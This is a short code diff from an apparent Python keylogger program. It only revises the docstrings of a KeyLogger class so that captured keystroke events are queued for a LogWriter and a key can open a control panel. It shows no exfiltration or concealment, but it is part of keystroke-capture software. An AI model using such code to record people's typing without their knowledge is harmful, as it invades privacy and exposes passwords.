@@ -39,7 +39,8 @@ import myutils
 import Queue
 
 class KeyLogger:
-	''' Captures all keystrokes, calls LogWriter class to log them to disk
+	''' Captures all keystrokes, puts events in Queue for later processing
+	by the LogWriter class
 	'''
 	def __init__(self): 
 		
@@ -64,7 +65,8 @@ class KeyLogger:
 
 	def OnKeyboardEvent(self, event):
 		'''This function is the stuff that's supposed to happen when a key is pressed.
-		Calls LogWriter.WriteToLogFile with the keystroke properties.
+		Puts the event in queue, and passes it on.
+		Starts control panel if proper key is pressed.
 		'''
 		#self.lw.WriteToLogFile(event)
 		self.q.put(event)
